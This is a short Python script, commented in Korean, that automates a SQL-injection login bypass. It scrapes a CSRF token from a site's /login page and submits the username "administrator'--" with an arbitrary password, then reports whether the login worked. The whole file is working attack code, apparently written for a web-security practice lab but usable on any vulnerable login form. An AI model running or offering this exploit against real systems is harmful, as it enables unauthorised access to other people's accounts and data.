import requests
import re

def run_auth_bypass(url):
    print("\n[Login Bypass SQL Injection 시작]\n")

    session = requests.Session()
    login_url = url.rstrip("/") + "/login"

    # 1. CSRF 토큰 가져오기
    res = session.get(login_url)
    csrf = re.search(r'name="csrf" value="(.*?)"', res.text).group(1)

    print(f"[CSRF 토큰]: {csrf}")

    payload = "administrator'--"

    # 2. 로그인 시도
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "anything"
    }

    res = session.post(login_url, data=data)

    if "Log out" in res.text or "My account" in res.text:
        print("✅ 로그인 성공")
    else:
        print("❌ 로그인 실패")